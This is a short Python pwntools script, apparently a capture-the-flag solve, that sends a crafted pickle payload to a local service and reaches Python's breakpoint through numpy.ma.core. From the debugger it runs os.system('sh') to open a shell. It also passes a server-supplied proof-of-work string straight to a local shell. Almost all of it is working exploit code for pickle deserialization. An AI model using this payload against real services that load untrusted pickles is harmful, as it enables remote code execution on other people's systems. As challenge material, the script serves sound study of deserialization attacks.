from pwn import *
from pickle import *
from subprocess import check_output

p = remote("localhost", 5000)

# solve pow
p.recvline()
p.sendline(check_output(p.recvline().strip(),shell=True).strip())

# win
pl = b''
pl += GLOBAL + b'numpy\nma.core.builtins.breakpoint\n' + EMPTY_TUPLE + REDUCE + STOP
p.sendline(pl.hex().encode('ascii'))
p.sendline(b'import os')
p.sendline(b'os.system("sh")')

print('you will have a shell give it a moment')

p.interactive()

